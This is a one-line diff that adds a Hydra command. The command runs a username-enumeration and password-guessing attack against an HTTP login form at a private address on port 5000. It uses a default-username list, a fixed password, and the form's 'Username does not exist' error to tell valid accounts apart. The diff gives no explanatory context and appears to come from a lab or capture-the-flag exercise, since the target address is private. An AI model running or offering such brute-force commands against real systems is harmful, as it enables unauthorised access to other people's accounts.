@@ -1,0 +1,1 @@
+hydra -L cirt_default_usernames.txt -p pepek 10.1.2.142 http-post-form "/login:username=^USER^&password=^PASS^:Username does not exist\!" -s 5000
